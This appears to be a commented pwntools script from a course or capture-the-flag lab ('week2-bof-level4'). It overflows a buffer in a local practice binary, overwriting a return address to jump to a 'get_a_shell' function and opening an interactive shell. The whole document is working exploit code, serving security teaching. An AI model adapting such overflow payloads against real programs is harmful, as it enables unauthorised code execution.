  # week2-bof-level4
  #!/usr/bin/env python                                                            
                                                                                    
  from pwn import *                                                                
                                                                                    
  # create process and run the program                                             
  p = process("./bof-level4")                                                      
                                                                                    
  # load the program as an ELF object                                              
  e = ELF("./bof-level4")                                                          
                                                                                   
  # get the address of get_a_shell                                                 
  get_a_shell = e.symbols['get_a_shell']                                           
                                                                                   
  # the address is in integer, so it prints a decimal value                        
  print(get_a_shell)                                                               
                                                                                   
  # you can print hexadecimal value with hex()                                     
  print(hex(get_a_shell))                                                          
  
  # send data with newline                                                         
  buf = "A"*20 + "ABCDEFGH" + "A"*8 + p32(0x804876b) + "A"*12 + p32(get_a_shell)   
  print(buf)                                                                                                                                                                                                                               
  p.sendline(buf)                                                                  
                                                                                   
  # open an interactive console to the program                                     
  p.interactive()